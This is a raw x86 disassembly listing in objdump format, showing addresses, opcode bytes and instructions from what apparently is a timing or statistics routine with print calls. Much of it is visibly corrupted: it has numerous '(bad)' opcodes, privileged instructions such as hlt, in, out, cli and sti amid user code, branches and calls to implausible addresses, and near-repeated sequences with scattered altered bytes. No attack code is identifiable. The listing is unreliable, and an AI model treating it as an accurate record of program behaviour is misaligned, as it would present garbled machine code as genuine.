  4029eb:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4029ee:	aa                   	stos   %al,%es:(%edi)
  4029ef:	55                   	push   %ebp
  4029f0:	f4                   	hlt
  4029f1:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4029f4:	05 f4 06 54 d6       	add    $0xd65406f4,%eax
  4029f9:	c5 d1 00             	(bad)
  4029fc:	6a 00                	push   $0x0
  4029fe:	70 e8                	jo     0x4029e8
  402a00:	03 87 9c 51 50 e8    	add    -0x17afae64(%edi),%eax
  402a06:	86 8b 00 00 8b 4d    	xchg   %cl,0x4d8b0000(%ebx)
  402a0c:	f9                   	stc
  402a0d:	89 45 93             	mov    %eax,-0x6d(%ebp)
  402a10:	8b 45 e0             	mov    -0x20(%ebp),%eax
  402a13:	6a 00                	push   $0x0
  402a15:	05 f4 a1 92 de       	add    $0xde92a1f4,%eax
  402a1a:	68 e8 03 78 00       	push   $0x7803e8
  402a1f:	83 5e 00 f6          	sbbl   $0xfffffff6,0x0(%esi)
  402a23:	55                   	push   %ebp
  402a24:	c2 51 50             	ret    $0x5051
  402a27:	e8 64 ab 00 00       	call   0x40d590
  402a2c:	17                   	pop    %ss
  402a2d:	a8 f4                	test   $0xf4,%al
  402a2f:	01 00                	add    %eax,(%eax)
  402a31:	00 6a 96             	add    %ch,-0x6a(%edx)
  402a34:	83 d3 00             	adc    $0x0,%ebx
  402a37:	68 e8 03 00 00       	push   $0x3e8
  402a3c:	53                   	push   %ebx
  402a3d:	59                   	pop    %ecx
  402a3e:	2a 45 c9             	sub    -0x37(%ebp),%al
  402a41:	b7 55                	mov    $0x55,%bh
  402a43:	e4 e8                	in     $0xe8,%al
  402a45:	2f                   	das
  402a46:	8b 00                	mov    (%eax),%eax
  402a48:	00 8b 8d 74 ff ff    	add    %cl,-0x8b73(%ebx)
  402a4e:	ff 89 45 d8 8b 85    	decl   -0x7a7427bb(%ecx)
  402a54:	70 ff                	jo     0x402a55
  402a56:	ff                   	(bad)
  402a57:	ff 8e 00 05 f4 01    	decl   0x1f40500(%esi)
  402a5d:	00 00                	add    %al,(%eax)
  402a5f:	fb                   	sti
  402a60:	e8 03 00 00 83       	call   0x83402a68
  402a65:	d1 b3 89 55 f4 51    	shll   $1,0x51f45589(%ebx)
  402a6b:	50                   	push   %eax
  402a6c:	e8 1f 8b 00 27       	call   0x2740b590
  402a71:	8b 4d bc             	mov    -0x44(%ebp),%ecx
  402a74:	8b f8                	mov    %eax,%edi
  402a76:	8b 45 b8             	mov    -0x48(%ebp),%eax
  402a79:	56                   	push   %esi
  402a7a:	00 c2                	add    %al,%dl
  402a7c:	f4                   	hlt
  402a7d:	01 e5                	add    %esp,%ebp
  402a7f:	00 0c e8             	add    %cl,(%eax,%ebp,8)
  402a82:	03 00                	add    (%eax),%eax
  402a84:	00 83 d1 7f 8b da    	add    %al,-0x2574802f(%ebx)
  402a8a:	51                   	push   %ecx
  402a8b:	f7 f6                	div    %esi
  402a8d:	ff 8a 00 00 28 79    	decl   0x79280000(%edx)
  402a93:	a8 c9                	test   $0xc9,%al
  402a95:	0d 10 c2 40 00       	or     $0x40c210,%eax
  402a9a:	89 45 b8             	mov    %eax,-0x48(%ebp)
  402a9d:	a1 20 d0 40 00       	mov    0x40d020,%eax
  402aa2:	85 6f 95             	test   %ebp,-0x6b(%edi)
  402aa5:	ef                   	out    %eax,(%dx)
  402aa6:	63 dd                	arpl   %ebx,%ebp
  402aa8:	45                   	inc    %ebp
  402aa9:	88 dc                	mov    %bl,%ah
  402aab:	0d 10 c2 40 00       	or     $0x40c210,%eax
  402ab0:	89 55 bc             	mov    %edx,-0x44(%ebp)
  402ab3:	dd 5d 80             	fstpl  -0x80(%ebp)
  402ab6:	de 45 90             	fiadds -0x70(%ebp)
  402ab9:	dc 0d b8 c2 40 00    	fmull  0x40c2b8
  402abf:	dd 5d 90             	fstpl  -0x70(%ebp)
  402ac2:	dd 10                	fstl   (%eax)
  402ac4:	78 ff                	js     0x402ac5
  402ac6:	ff                   	(bad)
  402ac7:	ff                   	lcall  (bad)
  402ac8:	dc 0d 10 c2 40 00    	fmull  0x40c210
  402ace:	dd 9d a1 ff 6a ff    	fstpl  -0x95005f(%ebp)
  402ad4:	0f 84 64 02 00 00    	je     0x402d3e
  402ada:	68 08 71 40 00       	push   $0x407108
  402adf:	ff d6                	call   *%esi
  402ae1:	63 55 73             	arpl   %edx,0x73(%ebp)
  402ae4:	2c 45                	sub    $0x45,%al
  402ae6:	f0 8b 4d ac          	lock mov -0x54(%ebp),%ecx
  402aea:	4a                   	dec    %edx
  402aeb:	57                   	push   %edi
  402aec:	52                   	push   %edx
  402aed:	8b 55 10             	mov    0x10(%ebp),%edx
  402af0:	1e                   	push   %ds
  402af1:	cc                   	int3
  402af2:	09 14 51             	or     %edx,(%ecx,%edx,2)
  402af5:	ee                   	out    %al,(%dx)
  402af6:	4d                   	dec    %ebp
  402af7:	f8                   	clc
  402af8:	b2 8b                	mov    $0x8b,%dl
  402afa:	55                   	push   %ebp
  402afb:	b4 33                	mov    $0x33,%ah
  402afd:	8b 45 b0             	mov    -0x50(%ebp),%eax
  402b00:	51                   	push   %ecx
  402b01:	3e 50                	ds push %eax
  402b03:	da d8                	fcmovu %st(0),%st
  402b05:	db 40 00             	fildl  0x0(%eax)
  402b08:	ff d6                	call   *%esi
  402b0a:	8e 85 68 ff ff 34    	mov    0x34ffff68(%ebp),%es
  402b10:	b3 8d                	mov    $0x8d,%bl
  402b12:	6c                   	insb   (%dx),%es:(%edi)
  402b13:	ff                   	(bad)
  402b14:	ff d3                	call   *%ebx
  402b16:	50                   	push   %eax
  402b17:	c4 30                	les    (%eax),%esi
  402b19:	05 f4 c6 00 00       	add    $0xc6f4,%eax
  402b1e:	83 d1 00             	adc    $0x0,%ecx
  402b21:	6a 00                	push   $0x0
  402b23:	68 e8 03 00 00       	push   $0x3e8
  402b28:	51                   	push   %ecx
  402b29:	50                   	push   %eax
  402b2a:	e8 61 8a 00 00       	call   0x40b590
  402b2f:	e1 d6                	loope  0x402b07
  402b31:	ec                   	in     (%dx),%al
  402b32:	52                   	push   %edx
  402b33:	d6                   	salc
  402b34:	55                   	push   %ebp
  402b35:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  402b36:	50                   	push   %eax
  402b37:	8b 8b f9 51 8b 4d    	mov    0x4d8b51f9(%ebx),%ecx
  402b3d:	88 52 a7             	mov    %dl,-0x59(%edx)
  402b40:	55                   	push   %ebp
  402b41:	69 50 8b 45 c8 51 8b 	imul   $0x8b51c845,-0x75(%eax),%edx
  402b48:	8d 64 ff ff          	lea    -0x1(%edi,%edi,8),%esp
  402b4c:	7c 52                	jl     0x402ba0
  402b4e:	50                   	push   %eax
  402b4f:	8b 85 dd ff ff ff    	mov    -0x23(%ebp),%eax
  402b55:	05 f4 01 00 00       	add    $0x1f4,%eax
  402b5a:	6a 00                	push   $0x0
  402b5c:	83 c6 00             	add    $0x0,%esi
  402b5f:	68 e8 03 00 00       	push   $0x3e8
  402b64:	51                   	push   %ecx
  402b65:	50                   	push   %eax
  402b66:	e8 1c 7d 00 00       	call   0x40a887
  402b6b:	52                   	push   %edx
  402b6c:	8a 68 30             	mov    0x30(%eax),%ch
  402b6f:	db 40 3b             	fildl  0x3b(%eax)
  402b72:	ff 5e 8b             	lcall  *-0x75(%esi)
  402b75:	ec                   	in     (%dx),%al
  402b76:	80 8b de 84 a7 c4 2c 	orb    $0x2c,-0x3b587b22(%ebx)
  402b7d:	05 f4 01 00 00       	add    $0x1f4,%eax
  402b82:	83 d1 00             	adc    $0x0,%ecx
  402b85:	6a 00                	push   $0x0
  402b87:	68 e8 01 00 00       	push   $0x1e8
  402b8c:	51                   	push   %ecx
  402b8d:	32 e8                	xor    %al,%ch
  402b8f:	53                   	push   %ebx
  402b90:	89 00                	mov    %eax,(%eax)
  402b92:	73 e9                	jae    0x402b7d
  402b94:	4d                   	dec    %ebp
  402b95:	e4 f3                	in     $0xf3,%al
  402b97:	8b 55 e0             	mov    -0x20(%ebp),%edx
  402b9a:	35 8b 45 94 51       	xor    $0x5194458b,%eax
  402b9f:	8b 4d 58             	mov    0x58(%ebp),%ecx
  402ba2:	f9                   	stc
  402ba3:	8b 55 c4             	mov    -0x3c(%ebp),%edx
  402ba6:	50                   	push   %eax
  402ba7:	51                   	push   %ecx
  402ba8:	52                   	push   %edx
  402ba9:	8b 50 c0             	mov    -0x40(%eax),%edx
  402bac:	d0 44 d4 50          	rolb   $1,0x50(%esp,%edx,8)
  402bb0:	8b 45 d0             	mov    -0x30(%ebp),%eax
  402bb3:	05 f4 a7 00 8c       	add    $0x8c00a7f4,%eax
  402bb8:	a9 00 83 d6 80       	test   $0x80d68300,%eax
  402bbd:	fd                   	std
  402bbe:	e8 03 00 bb 51       	call   0x51fb2bc6
  402bc3:	af                   	scas   %es:(%edi),%eax
  402bc4:	14 e2                	adc    $0xe2,%al
  402bc6:	89 c1                	mov    %eax,%ecx
  402bc8:	00 52 50             	add    %dl,0x50(%edx)
  402bcb:	bd 78 db da 00       	mov    $0xdadb78,%ebp
  402bd0:	ff d6                	call   *%esi
  402bd2:	8b 4d bc             	mov    -0x44(%ebp),%ecx
  402bd5:	bb 55 b8 8b 1b       	mov    $0x1b8bb855,%ebx
  402bda:	dc 51 8b             	fcoml  -0x75(%ecx)
  402bdd:	59                   	pop    %ecx
  402bde:	d8 52 22             	fcoms  0x22(%edx)
  402be1:	95                   	xchg   %eax,%ebp
  402be2:	7c 2a                	jl     0x402c0e
  402be4:	2f                   	das
  402be5:	ff e5                	jmp    *%ebp
  402be7:	8b 85 d1 ff ff ff    	mov    -0x2f(%ebp),%eax
  402bed:	03 8b 4d 75 e5 8b    	add    -0x741a8ab3(%ebx),%ecx
  402bf3:	55                   	push   %ebp
  402bf4:	b9 50 8b 45 95       	mov    $0x95458b50,%ecx
  402bf9:	51                   	push   %ecx
  402bfa:	8b 4d a0             	mov    -0x60(%ebp),%ecx
  402bfd:	52                   	push   %edx
  402bfe:	50                   	push   %eax
  402bff:	fa                   	cli
  402c00:	68 0a 59 40 53       	push   $0x5340590a
  402c05:	ff d6                	call   *%esi
  402c07:	df 6d f8             	fildll -0x8(%ebp)
  402c0a:	df 6d f0             	fildll -0x10(%ebp)
  402c0d:	b8 c4 58 de e9       	mov    $0xe9de58c4,%eax
  402c12:	dc b5 27 4c 40 00    	fdivl  0x404c27(%ebp)
  402c18:	df e0                	fnstsw %ax
  402c1a:	f6 c4 05             	test   $0x5,%ah
  402c1d:	7a 02                	jp     0x402c21
  402c1f:	d9 02                	flds   (%edx)
  402c21:	dd 45 a8             	fldl   -0x58(%ebp)
  402c24:	dc c0                	fadd   %st,%st(0)
  402c26:	46                   	inc    %esi
  402c27:	6a de                	push   $0xffffffde
  402c29:	d9 df                	(bad)
  402c2b:	e0 64                	loopne 0x402c91
  402c2d:	00 41 04             	add    %al,0x4(%ecx)
  402c30:	00 75 09             	add    %dh,0x9(%ebp)
  402c33:	ad                   	lods   %ds:(%esi),%eax
  402c34:	d8 dd                	fcomp  %st(5)
  402c36:	b0 da                	mov    $0xda,%al
  402c38:	40                   	inc    %eax
  402c39:	6d                   	insl   (%dx),%es:(%edi)
  402c3a:	eb 11                	jmp    0x402c4d
  402c3c:	dc 5d a8             	fcompl -0x58(%ebp)
  402c3f:	df e0                	fnstsw %ax
  402c41:	25 00 41 00 00       	and    $0x4100,%eax
  402c46:	75 0a                	jne    0x402c52
  402c48:	68 18 da 40 94       	push   $0x9440da18
  402c4d:	cc                   	int3
  402c4e:	d6                   	salc
  402c4f:	83 6f 04 df          	subl   $0xffffffdf,0x4(%edi)
  402c53:	6d                   	insl   (%dx),%es:(%edi)
  402c54:	c8 4f 6d b1          	enter  $0x6d4f,$0xb1
  402c58:	de e9                	fsubrp %st,%st(1)
  402c5a:	dc 15 30 c2 40 00    	fcoml  0x40c230
  402c60:	df e0                	fnstsw %ax
  402c62:	f6 c4 b2             	test   $0xb2,%ah
  402c65:	7a 02                	jp     0x402c69
  402c67:	d9 e0                	fchs
  402c69:	60                   	pusha
  402c6a:	45                   	inc    %ebp
  402c6b:	88 dc                	mov    %bl,%ah
  402c6d:	c0 d9 c1             	rcr    $0xc1,%cl
  402c70:	de d9                	fcompp
  402c72:	07                   	pop    %es
  402c73:	44                   	inc    %esp
  402c74:	25 00 41 00 00       	and    $0x4100,%eax
  402c79:	75 11                	jne    0x402c8c
  402c7b:	dd d8                	fstp   %st(0)
  402c7d:	68 4e 78 40 00       	push   $0x40784e
  402c82:	eb db                	jmp    0x402c5f
  402c84:	dc 0e                	fmull  (%esi)
  402c86:	88 df                	mov    %bl,%bh
  402c88:	b7 04                	mov    $0x4,%bh
  402c8a:	00 41 00             	add    %al,0x0(%ecx)
  402c8d:	00 75 ad             	add    %dh,-0x53(%ebp)
  402c90:	31 4f d8             	xor    %ecx,-0x28(%edi)
  402c93:	40                   	inc    %eax
  402c94:	00 65 d6             	add    %ah,-0x2a(%ebp)
  402c97:	83 c4 62             	add    $0x62,%esp
  402c9a:	df 6d c0             	fildll -0x40(%ebp)
  402c9d:	df 6d 5e             	fildll 0x5e(%ebp)
  402ca0:	de e9                	fsubrp %st,%st(1)
  402ca2:	9d                   	popf
  402ca3:	15 30 c2 40 00       	adc    $0x40c230,%eax
  402ca8:	df 2b                	fildll (%ebx)
  402caa:	f6 c4 c6             	test   $0xc6,%ah
  402cad:	7a 02                	jp     0x402cb1
  402caf:	d9 e0                	fchs
  402cb1:	37                   	aaa
  402cb2:	45                   	inc    %ebp
  402cb3:	90                   	nop
  402cb4:	dc c0                	fadd   %st,%st(0)
  402cb6:	d9 c1                	fld    %st(1)
  402cb8:	de d9                	fcompp
  402cba:	df e0                	fnstsw %ax
  402cbc:	3b 00                	cmp    (%eax),%eax
  402cbe:	41                   	inc    %ecx
  402cbf:	00 00                	add    %al,(%eax)
  402cc1:	4f                   	dec    %edi
  402cc2:	85 36                	test   %esi,(%esi)
  402cc4:	d8 68 68             	fsubrs 0x68(%eax)
  402cc7:	c8 7e 00 eb          	enter  $0x7e,$0xeb
  402ccb:	11 dc                	adc    %ebx,%esp
  402ccd:	69 90 df e0 25 00 41 	imul   $0x75000041,0x25e0df(%eax),%edx
  402cd4:	00 00 75 
  402cd7:	0a 75 d8             	or     -0x28(%ebp),%dh
  402cda:	f2 40                	repnz inc %eax
  402cdc:	00 ff                	add    %bh,%bh
  402cde:	d6                   	salc
  402cdf:	46                   	inc    %esi
  402ce0:	c4 04 df             	les    (%edi,%ebx,8),%eax
  402ce3:	e4 98                	in     $0x98,%al
  402ce5:	df 6d d8             	fildll -0x28(%ebp)
  402ce8:	d5 e9                	aad    $0xe9
  402cea:	dc 15 30 bc 40 00    	fcoml  0x40bc30
  402cf0:	df e0                	fnstsw %ax
  402cf2:	14 c4                	adc    $0xc4,%al
  402cf4:	05 7a 02 44 e0       	add    $0xe044027a,%eax
  402cf9:	c8 85 60 0a          	enter  $0x6085,$0xa
  402cfd:	ff                   	(bad)
  402cfe:	ff 95 c0 d9 c1 de    	call   *-0x213e2640(%ebp)
  402d04:	b5 df                	mov    $0xdf,%ch
  402d06:	e0 fa                	loopne 0x402d02
  402d08:	00 41 00             	add    %al,0x0(%ecx)
  402d0b:	00 75 11             	add    %dh,0x11(%ebp)
  402d0e:	68 50 d7 40 00       	push   $0x40d750
  402d13:	dd d8                	fstp   %st(0)
  402d15:	6b d6 83             	imul   $0xffffff83,%esi,%edx
  402d18:	c4 04 e9             	les    (%ecx,%ebp,8),%eax
  402d1b:	9c                   	pushf
  402d1c:	00 00                	add    %al,(%eax)
  402d1e:	00 dc                	add    %bl,%ah
  402d20:	9d                   	popf
  402d21:	78 ff                	js     0x402d22
  402d23:	ff c4                	inc    %esp
  402d25:	b6 17                	mov    $0x17,%dh
  402d27:	25 a7 41 38 00       	and    $0x3841a7,%eax
  402d2c:	0f 85 83 48 00 00    	jne    0x4075b5
  402d32:	87 c0                	xchg   %eax,%eax
  402d34:	d6                   	salc
  402d35:	40                   	inc    %eax
  402d36:	00 86 d6 83 c4 04    	add    %al,0x4c483d6(%esi)
  402d3c:	a2 77 68 a0 d6       	mov    %al,0xd6a06877
  402d41:	40                   	inc    %eax
  402d42:	00 ff                	add    %bh,%bh
  402d44:	82 8b 55 fc 8b 45 f8 	orb    $0xf8,0x458bfc55(%ebx)
  402d4b:	8b 4d b4             	mov    -0x4c(%ebp),%ecx
  402d4e:	53                   	push   %ebx
  402d4f:	57                   	push   %edi
  402d50:	52                   	push   %edx
  402d51:	bd 3d b0 50 51       	mov    $0x5150b03d,%ebp
  402d56:	52                   	push   %edx
  402d57:	68 21 d6 40 f1       	push   $0xf140d621
  402d5c:	ff d6                	call   *%esi
  402d5e:	8b 45 83             	mov    -0x7d(%ebp),%eax
  402d61:	8b 4d 19             	mov    0x19(%ebp),%ecx
  402d64:	8b fd                	mov    %ebp,%edi
  402d66:	98                   	cwtl
  402d67:	2b df                	sub    %edi,%ebx
  402d69:	8b 7d f8             	mov    -0x8(%ebp),%edi
  402d6c:	1b cb                	sbb    %ebx,%ecx
  402d6e:	8b 5d a0             	mov    -0x60(%ebp),%ebx
  402d71:	a1 8b 4d 27 50       	mov    0x50274d8b,%eax
  402d76:	8b 45 9c             	mov    -0x64(%ebp),%eax
  402d79:	42                   	inc    %edx
  402d7a:	d7                   	xlat   %ds:(%ebx)
  402d7b:	8b 7d a4             	mov    -0x5c(%ebp),%edi
  402d7e:	1b 0b                	sbb    (%ebx),%ecx
  402d80:	01 cb                	add    %ecx,%ebx
  402d82:	50                   	push   %eax
  402d83:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  402d86:	52                   	push   %edx
  402d87:	8b 55 07             	mov    0x7(%ebp),%edx
  402d8a:	2b ca                	sub    %edx,%ecx
  402d8c:	8b d7                	mov    %edi,%edx
  402d8e:	fa                   	cli
  402d8f:	d0 ab bf 68 58 d6    	shrb   $1,-0x29a79741(%ebx)
  402d95:	40                   	inc    %eax
  402d96:	c1 ff d6             	sar    $0xd6,%edi
  402d99:	8b 26                	mov    (%esi),%esp
  402d9b:	18 8b 4d a8 8b 55    	sbb    %cl,0x558ba84d(%ebx)
  402da1:	9c                   	pushf
  402da2:	50                   	push   %eax
  402da3:	8b 45 98             	mov    -0x68(%ebp),%eax
  402da6:	51                   	push   %ecx
  402da7:	52                   	push   %edx
  402da8:	50                   	push   %eax
  402da9:	7a 53                	jp     0x402dfe
  402dab:	68 34 d6 40 00       	push   $0x40d634
  402db0:	ff d6                	call   *%esi
  402db2:	83 98 58 45 1c d0 40 	sbbl   $0x40,-0x2fe3baa8(%eax)
  402db9:	23 57 c0             	and    -0x40(%edi),%edx
  402dbc:	0f 84 c5 00 8a 00    	je     0xca2e87
  402dc2:	21 3d f5 ee 41 00    	and    %edi,0x41eef5
  402dc8:	01 0f                	add    %ecx,(%edi)
  402dca:	8e b8 00 00 35 68    	mov    0x68350000(%eax),%?
  402dd0:	f9                   	stc
  402dd1:	d5 40                	aad    $0x40
  402dd3:	00 06                	add    %al,(%esi)
  402dd5:	d6                   	salc
  402dd6:	83 c4 04             	add    $0x4,%esp
  402dd9:	33 db                	xor    %ebx,%ebx
  402ddb:	8b bb 34 d0 40 00    	mov    0x40d034(%ebx),%edi
  402de1:	52                   	push   %edx
  402de2:	ff                   	(bad)
  402de3:	7f 0f                	jg     0x402df4
  402de5:	68 e0 66 40 00       	push   $0x4066e0
  402dea:	ff d6                	call   *%esi
  402dec:	83 c4 04             	add    $0x4,%esp
  402def:	e9 87 6d bb 00       	jmp    0xfb9b7b
  402df4:	6a 74                	push   $0x74
  402df6:	e1 ff                	loope  0x402df7
  402df8:	64 68 87 03 00 00    	fs push $0x387
  402dfe:	7c 34                	jl     0x402e34
  402e00:	8b 0d ac 02 55 00    	mov    0x5502ac,%ecx
  402e06:	a1 c8 0b 41 9a       	mov    0x9a410bc8,%eax
  402e0b:	89 af 2a 8b 54 01    	mov    %ebp,0x1548b2a(%edi)
  402e11:	f8                   	clc
  402e12:	35 c2 f4 01 00       	xor    $0x1f4c2,%eax
  402e17:	00 8b 44 e8 fc 62    	add    %cl,0x62fce844(%ebx)
  402e1d:	d0 00                	rolb   $1,(%eax)
  402e1f:	50                   	push   %eax
  402e20:	52                   	push   %edx
  402e21:	e8 ba 1b 8f 00       	call   0xcf49e0
  402e26:	52                   	push   %edx
  402e27:	50                   	push   %eax
  402e28:	68 ef d5 40 00       	push   $0x40d5ef
  402e2d:	ff d6                	call   *%esi
  402e2f:	83 c4 d6             	add    $0xffffffd6,%esp
  402e32:	eb 47                	jmp    0x402e7b
  402e34:	12 cf                	adc    %bh,%cl
  402e36:	b8 1f 85 c1 51       	mov    $0x51c1851f,%eax
  402e3b:	0f 15 0d ac 02 41 00 	unpckhps 0x4102ac,%xmm1
  402e42:	f7 e9                	imul   %ecx
  402e44:	c1 fa 05             	sar    $0x5,%edx
  402e47:	22 c8                	and    %al,%cl
  402e49:	0b 41 00             	or     0x0(%ecx),%eax
  402e4c:	8b ca                	mov    %edx,%ecx
  402e4e:	c1 e9 1f             	shr    $0x1f,%ecx
  402e51:	03 d1                	add    %ecx,%edx
  402e53:	f0 e2 05             	lock loop 0x402e5b
  402e56:	8b d8                	mov    %eax,%ebx
  402e58:	02 18                	add    (%eax),%bl
  402e5a:	81 c1 f4 01 00 00    	add    $0x1f4,%ecx
  402e60:	8b 54 02 e3          	mov    -0x1d(%edx,%eax,1),%edx
  402e64:	83 d2 00             	adc    $0x0,%edx
  402e67:	52                   	push   %edx
  402e68:	d6                   	salc
  402e69:	e8 71 87 00 00       	call   0x40b5df
  402e6e:	87 50 57             	xchg   %edx,0x57(%eax)
  402e71:	68 ac 52 a7 00       	push   $0xa752ac
  402e76:	ff d6                	call   *%esi
  402e78:	83 c4 10             	add    $0x10,%esp
  402e7b:	18 c3                	sbb    %al,%bl
  402e7d:	04 83                	add    $0x83,%al
  402e7f:	fb                   	sti
  402e80:	24 0f                	and    $0xf,%al
  402e82:	82 54 ff ff ff       	adcb   $0xff,-0x1(%edi,%edi,8)
  402e87:	a1 e0 bc 6e 00       	mov    0x6ebce0,%eax
  402e8c:	eb c0                	jmp    0x402e4e
  402e8e:	66 f1                	data16 int1
  402e90:	34 00                	xor    $0x0,%al
  402e92:	00 00                	add    %al,(%eax)
  402e94:	68 a8 d5 40 00       	push   $0x40d5a8
  402e99:	50                   	push   %eax
  402e9a:	ff 15 48 c1 e4 00    	call   *0xe4c148
  402ea0:	8b f8                	mov    %eax,%edi
  402ea2:	83 c4 08             	add    $0x8,%esp
  402ea5:	85 ff                	test   %edi,%edi
  402ea7:	ed                   	in     (%dx),%eax
  402ea8:	16                   	push   %ss
  402ea9:	68 8c 5c 40 00       	push   $0x405c8c
  402eae:	ff 13                	call   *(%ebx)
  402eb0:	4c                   	dec    %esp
  402eb1:	c1 40 00 a4          	roll   $0xa4,0x0(%eax)
  402eb5:	2e 04 6a             	cs add $0x6a,%al
  402eb8:	01 ff                	add    %edi,%edi
  402eba:	56                   	push   %esi
  402ebb:	70 c1                	jo     0x402e7e
  402ebd:	40                   	inc    %eax
  402ebe:	00 68 6c             	add    %ch,0x6c(%eax)
  402ec1:	d5 40                	aad    $0x40
  402ec3:	00 57 ff             	add    %dl,-0x1(%edi)
  402ec6:	15 80 c1 40 00       	adc    $0x40c180,%eax
  402ecb:	8b 1d 80 c1 40 00    	mov    0x40c180,%ebx
  402ed1:	83 c4 08             	add    $0x8,%esp
  402ed4:	b6 f6                	mov    $0xf6,%dh
  402ed6:	85 40 75             	test   %eax,0x75(%eax)
  402ed9:	0a f0                	or     %al,%dh
  402edb:	c8 0b 41 00          	enter  $0x410b,$0x0
  402edf:	df 68 74             	fildll 0x74(%eax)
  402ee2:	eb 46                	jmp    0x402f2a
  402ee4:	83 fe c4             	cmp    $0xffffffc4,%esi
  402ee7:	75 15                	jne    0x402efe
  402ee9:	8b 0d 08 02 41 00    	mov    0x410208,%ecx
  402eef:	8b 15 c8 ce 41 00    	mov    0x41cec8,%edx
  402ef5:	c1 e1 05             	shl    $0x5,%ecx
  402ef8:	df 6c 11 2f          	fildll 0x2f(%ecx,%edx,1)
  402efc:	eb 2c                	jmp    0x402f2a
  402efe:	a1 ac 02 41 00       	mov    0x4102ac,%eax
  402f03:	0f af c6             	imul   %esi,%eax
  402f06:	18 45 f4             	sbb    %al,-0xc(%ebp)
  402f09:	db 45 f4             	fildl  -0xc(%ebp)
  402f0c:	dc 0d 8e c2 40 00    	fmull  0x40c28e
  402f12:	dc 05 00 c2 40 e9    	faddl  0xe940c200
  402f18:	e8 63 86 00 00       	call   0x40b580
  402f1d:	8b 0d 77 0b 41 00    	mov    0x410b77,%ecx
  402f23:	c1 e0 05             	shl    $0x5,%eax
  402f26:	df 6c 08 18          	fildll 0x18(%eax,%ecx,1)
  402f2a:	dc 0d 10 c2 8e 00    	fmull  0x8ec210
  402f30:	dd 5d d8             	fstpl  -0x28(%ebp)
  402f33:	8b 03                	mov    (%ebx),%eax
  402f35:	dc 8b 45 d8 52 50    	fmull  0x5052d845(%ebx)
  402f3b:	56                   	push   %esi
  402f3c:	68 8b d5 40 00       	push   $0x40d58b
  402f41:	57                   	push   %edi
  402f42:	ff 69 83             	ljmp   *-0x7d(%ecx)
  402f45:	c4 14 46             	les    (%esi,%eax,2),%edx
  402f48:	83 fe 64             	cmp    $0x64,%esi
  402f4b:	7c 89                	jl     0x402ed6
  402f4d:	57                   	push   %edi
  402f4e:	ff 0f                	decl   (%edi)
  402f50:	50                   	push   %eax
  402f51:	c1 53 00 83          	rcll   $0x83,0x0(%ebx)
  402f55:	c4 0f                	les    (%edi),%ecx
  402f57:	05 b8 5f 4d 00       	add    $0x4d5fb8,%eax
  402f5c:	d1 c0                	rol    $1,%eax
  402f5e:	0f 84 61 6f 00 a1    	je     0xa1409ec5
  402f64:	f4                   	hlt
  402f65:	a8 28                	test   $0x28,%al
  402f67:	40                   	inc    %eax
  402f68:	00 50 46             	add    %dl,0x46(%eax)
  402f6b:	15 48 c1 ab 00       	adc    $0xabc148,%eax
  402f70:	83 c4 08             	add    $0x8,%esp
  402f73:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402f76:	4b                   	dec    %ebx
  402f77:	c0 4a 16 68          	rorb   $0x68,0x16(%edx)
  402f7b:	7f d5                	jg     0x402f52
  402f7d:	ce                   	into
  402f7e:	00 a1 c1 27 c1 40    	add    %ah,0x40c127c1(%ecx)
  402f84:	00 83 c4 04 6a 01    	add    %al,0x16a04c4(%ebx)
  402f8a:	ff 15 70 bb 40 00    	call   *0x40bb70
  402f90:	68 14 d5 40 00       	push   $0x40d514
  402f95:	50                   	push   %eax
  402f96:	ff 15 80 c1 40 00    	call   *0x40c180
  402f9c:	a1 ac 36 41 00       	mov    0x4136ac,%eax
  402fa1:	83 c4 08             	add    $0x8,%esp
  402fa4:	85 33                	test   %esi,(%ebx)
  402fa6:	c7                   	(bad)
  402fa7:	23 85 00 00 6f 06    	and    0x66f0000(%ebp),%eax
  402fad:	0f 8e 05 01 00 00    	jle    0x4030b8
  402fb3:	33 88 a1 c8 0b 41    	xor    0x410bc8a1(%eax),%ecx
  402fb9:	00 8b 4c 06 04 8b    	add    %cl,-0x74fbf9b4(%ebx)
  402fbf:	14 06                	adc    $0x6,%al
  402fc1:	51                   	push   %ecx
  402fc2:	8d                   	lea    (bad),%ebx
  402fc3:	d8 42 ff             	fadds  -0x1(%edx)
  402fc6:	b3 ff                	mov    $0xff,%bl
  402fc8:	e2 50                	loop   0x40301a
  402fca:	e8 51 61 00 00       	call   0x409120
  402fcf:	9b                   	fwait
  402fd0:	3d c8 0b 41 f8       	cmp    $0xf8410bc8,%eax
  402fd5:	6a 7c                	push   $0x7c
  402fd7:	68 e8 03 00 18       	push   $0x180003e8
  402fdc:	8b 4c 3e 1c          	mov    0x1c(%esi,%edi,1),%ecx
  402fe0:	8b f6                	mov    %esi,%esi
  402fe2:	3e 10 8b 44 3e 14 89 	adc    %cl,%ds:-0x76ebc1bc(%ebx)
  402fe9:	4d                   	dec    %ebp
  402fea:	dc 8b 4c 0b 08 8b    	fmull  -0x74f7f4b4(%ebx)
  402ff0:	5c                   	pop    %esp
  402ff1:	3e 18 89 3d d0 8b 34 	sbb    %cl,%ds:0x348bd03d(%ecx)
  402ff8:	3e 0c 81             	ds or  $0x81,%al
  402ffb:	ab                   	stos   %eax,%es:(%edi)
  402ffc:	0e                   	push   %cs
  402ffd:	01 58 68             	add    %ebx,0x68(%eax)
  403000:	89 ab d4 83 d2 00    	mov    %ebp,0xd283d4(%ebx)
  403006:	cc                   	int3
  403007:	51                   	push   %ecx
  403008:	e8 83 85 00 00       	call   0x40b590
  40300d:	8b 4d 8a             	mov    -0x76(%ebp),%ecx
  403010:	52                   	push   %edx
  403011:	50                   	push   %eax
  403012:	8b c3                	mov    %ebx,%eax
  403014:	05 f4 01 d4 00       	add    $0xd401f4,%eax
  403019:	6a 00                	push   $0x0
  40301b:	83 f9 00             	cmp    $0x0,%ecx
  40301e:	68 e8 ec 00 00       	push   $0xece8
  403023:	4f                   	dec    %edi
  403024:	8b b6 66 85 00 00    	mov    0x8566(%esi),%esi
  40302a:	52                   	push   %edx
  40302b:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  40302e:	50                   	push   %eax
  40302f:	a1 45 1d 2b 43       	mov    0x432b1d45,%eax
  403034:	8b 45 04             	mov    0x4(%ebp),%eax
  403037:	1b c2                	sbb    %edx,%eax
  403039:	81 c3 f4 01 00 00    	add    $0x1f4,%ebx
  40303f:	83 ab 00 6a 00 68 e8 	subl   $0xffffffe8,0x68006a00(%ebx)
